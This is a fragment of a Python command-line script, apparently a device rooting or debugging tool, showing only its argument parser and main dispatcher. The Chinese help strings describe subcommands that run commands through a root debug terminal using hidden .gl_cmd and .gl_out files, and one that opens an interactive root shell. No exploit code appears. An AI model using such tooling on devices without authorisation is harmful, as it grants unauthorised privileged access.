                       help="通过 root 调试终端执行命令（$DIR/.gl_cmd -> .gl_out）")
    e.add_argument("--timeout", type=int, default=60)
    e.add_argument("argv_", nargs=argparse.REMAINDER)

    sl = sub.add_parser("shell", parents=[common], help="root 调试终端交互")
    sl.add_argument("--timeout", type=int, default=60)

    args = ap.parse_args()

    if args.cmd == "check":
        return cmd_check(args)
    if args.cmd == "setup":
        return cmd_setup(args)
    if args.cmd == "run":
        if getattr(args, "on_boot", False):
            return cmd_run_boot(args)
        return cmd_run(args)
    if args.cmd == "status":
        res = cmd_status(args)
        return 0 if res.get("root") else 1
    if args.cmd == "pull-log":
        return cmd_pull_log(args)
    if args.cmd == "exec":
        return cmd_exec(args)
    if args.cmd == "shell":
        return cmd_shell(args)
    return 0


if __name__ == "__main__":
    sys.exit(main())
